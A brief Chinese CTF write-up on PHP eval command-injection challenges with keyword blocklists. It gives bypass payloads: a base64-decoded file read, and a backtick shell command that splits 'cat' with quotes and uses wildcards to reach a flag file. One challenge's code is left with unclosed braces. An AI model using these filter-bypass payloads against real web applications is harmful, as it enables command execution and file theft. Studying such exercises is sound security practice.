# 第二题

```bash
<?php

include("flag.php");
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if(!preg_match("/system|exec|highlight|show_source|cat|head|tail|more|less/i",$cmd)){

            eval($cmd);
        } else {
            die("HACK!!");

        die("HACK!!!");

?>
```

# 第三题

```php
<?php
# flag in flag.php
include("flag.php");
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if(!preg_match("/system|exec|highlight|show_source|include|passthru|flag|php|cat|head|tail|more|less/i",$cmd)){
        if(preg_match("/base/i",$cmd)){
            eval($cmd);
        } else {
            die("HACK!!");
        }
    } else {
        die("HACK!!!");
    }
} else {
    highlight_file(__FILE__);
}
?>
```

## write up

似乎是想让我们使用`base64_decode` 函数 ,因为他不让参数中有flag 字符

所以使用 `?cmd=readfile(base64_decode("L3RtcC9mbGFnLmNpc3A="));` 

先将要读的文件名base64编码，然后再解码，在读取文件

# 第六题

```php
<?php
# flag in flag.php
include("flag.php");

    $cmd = $_GET['cmd'];
    if(!preg_match("/system|exec|highlight|show_source|include|passthru|php|flag|print_r|cat|head|tail|more|less|;/i",$cmd)){

        die("HACK!!!");

```

## write up

所以这里使用 `？>`来代替,例如?cmd=echo\`c'a't /tmp/fla?.p?p\`?>
